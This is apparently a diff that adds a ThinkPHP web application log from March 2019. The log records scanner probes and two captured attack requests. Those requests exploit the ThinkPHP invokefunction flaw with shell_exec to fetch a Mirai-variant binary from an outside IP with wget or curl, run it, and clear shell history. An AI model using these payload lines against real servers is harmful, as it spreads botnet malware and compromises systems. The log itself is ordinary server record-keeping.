@@ -1,0 +1,48 @@
+[ 2019-03-07T00:48:20+08:00 ] 185.248.100.159 /goip/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000083s ]
+ERR: 无法加载模块:Goip
+
+[ 2019-03-07T02:24:19+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
+ERR: 无法加载模块:Cache
+
+[ 2019-03-07T11:23:23+08:00 ] 157.230.189.162 /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://68.183.97.243/miori.x86;cat%20miori.x86%20%3E%20Mira01;chmod%20777%20Mira01;./Mira01%20thinkphp;%20rm%20rf%20Mira01%20miori.x86;%20history%20-c
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000101s ]
+ERR: 无法加载模块:Index
+
+[ 2019-03-07T11:23:24+08:00 ] 157.230.189.162 /public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;curl%20-O%20http://68.183.97.243/miori.x86;cat%20miori.x86%20%3E%20Mira01;chmod%20777%20Mira01;./Mira01%20thinkphp;%20rm%20rf%20Mira01%20miori.x86;%20history%20-c
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000072s ]
+ERR: 无法加载模块:Index
+
+[ 2019-03-07T11:39:47+08:00 ] 216.245.197.254 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000087s ]
+ERR: 无法加载模块:Robots
+
+[ 2019-03-07T12:17:41+08:00 ] 123.126.113.183 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
+ERR: 无法加载模块:Robots
+
+[ 2019-03-07T12:32:14+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000069s ]
+ERR: 无法加载模块:Cache
+
+[ 2019-03-07T14:01:55+08:00 ] 182.254.241.79 /9893D3A2E2B9533051F96E4FABA1933D.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
+ERR: 无法加载模块:9893D3A2E2B9533051F96E4FABA1933D
+
